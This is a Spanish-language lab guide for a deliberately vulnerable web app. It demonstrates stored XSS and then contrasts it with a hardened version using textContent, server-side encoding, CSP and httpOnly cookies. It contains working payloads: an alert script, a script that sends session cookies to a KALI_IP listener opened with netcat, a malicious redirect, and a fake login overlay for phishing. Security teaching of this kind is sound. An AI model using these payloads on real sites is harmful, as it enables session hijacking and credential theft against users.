# Demo 2 — Cross-Site Scripting (XSS)

## Concepto

XSS ocurre cuando una aplicación incluye datos no validados en una página web, permitiendo que un atacante inyecte scripts que se ejecutan en el navegador de otros usuarios.

Hay dos tipos que demostraremos:

- **Stored XSS:** El script malicioso se guarda en la base de datos y se ejecuta cada vez que alguien ve la página.
- **Reflected XSS:** El script se incluye en la URL y se ejecuta inmediatamente al visitarla.

**Código vulnerable (hacklab-vulnerable/public/js/app.js):**
```javascript
// ❌ INSEGURO: innerHTML interpreta y ejecuta HTML/JS del servidor
container.innerHTML = list.map(c => `
  <div class="comment-body">${c.content}</div>
`).join('');
```

---

## Paso a paso del ataque

### Requisitos

- Acceso al navegador en Kali Linux
- Servidor de escucha para robo de cookies (opcional, para demo avanzada)

### Preparación: Iniciar sesión en la versión vulnerable

1. Abra `http://HOST_IP:3000/login.html` en Kali
2. Ingrese con `jlopez` / `password`
3. Vaya a la sección **Soporte** en el menú lateral

---

### Parte 1: XSS Básico — Alert

En el campo de mensajes del canal de soporte, ingrese:

```html
<script>alert('XSS ejecutado exitosamente!')</script>
```

Haga clic en **Enviar mensaje**.

**Resultado esperado:** Un cuadro de alerta aparece inmediatamente. Cada vez que cualquier usuario (incluyendo el admin) visite la sección de Soporte, verá el alert.

---

### Parte 2: XSS Avanzado — Robo de cookies de sesión

En Kali Linux, abra una terminal y levante un servidor de escucha:

```bash
# Abrir listener en puerto 8080
nc -lvnp 8080

# Alternativa: usar Python
python3 -m http.server 8080
```

Luego, en el campo de comentarios de la app, ingrese el siguiente payload (reemplace KALI_IP con su IP):

```html
<script>
  var img = new Image();
  img.src = 'http://KALI_IP:8080/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Resultado esperado:** En el listener de Kali verá una petición GET con la cookie de sesión del usuario que cargó la página. Con esa cookie el atacante puede secuestrar la sesión sin necesitar contraseña.

---

### Parte 3: XSS — Redirección maliciosa

```html
<script>window.location.href = 'http://sitio-malicioso.com';</script>
```

O un formulario de phishing falso que se superpone a la página real:

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;display:flex;align-items:center;justify-content:center;">
  <div style="border:1px solid #ccc;padding:30px;max-width:340px;font-family:sans-serif;">
    <h3>Sesión expirada. Ingrese nuevamente.</h3>
    <input type="text" placeholder="Usuario" style="width:100%;margin:8px 0;padding:8px;"><br>
    <input type="password" placeholder="Contraseña" style="width:100%;margin:8px 0;padding:8px;"><br>
    <button onclick="alert('Credenciales enviadas al atacante!')" style="width:100%;padding:10px;background:#0b2447;color:white;border:none;cursor:pointer;">Ingresar</button>
  </div>
</div>
```

---

### Parte 4: Repetir contra la versión SEGURA (puerto 4000)

1. Ingresar a `http://HOST_IP:4000/login.html` con `jlopez` / `password`
2. Ir a **Soporte** e intentar el mismo payload: `<script>alert('XSS')</script>`

**Resultado esperado:** El texto se muestra literalmente como `<script>alert('XSS')</script>` sin ejecutarse. El script es neutralizado.

---

## Por qué funciona la protección

**En la versión vulnerable** se usa `innerHTML`, que interpreta el texto como HTML y ejecuta los scripts.

**En la versión segura** se usa `textContent` (en el frontend) y `he.encode()` (en el servidor):

```javascript
// ✅ SEGURO: textContent nunca interpreta HTML
body.textContent = c.content; // "<script>..." se muestra como texto

// ✅ En el servidor, he.encode() convierte caracteres peligrosos:
// < → &lt;    > → &gt;    " → &quot;    ' → &#x27;
const safeContent = he.encode(content);
```

Además, el **Content Security Policy (CSP)** configurado en helmet bloquea scripts inline:
```
Content-Security-Policy: script-src 'self'
```

---

## Comparación de código

| Aspecto | Vulnerable | Seguro |
|---------|-----------|--------|
| Renderizado | `innerHTML = content` | `textContent = content` |
| Guardado | Sin sanitización | `he.encode(content)` en servidor |
| Headers CSP | Sin CSP | `script-src 'self'` |
| Cookie | `httpOnly: false` | `httpOnly: true` |

---

## Referencias

- OWASP Top 10 A03:2021 — XSS: https://owasp.org/www-community/attacks/xss/
- OWASP XSS Prevention Cheat Sheet
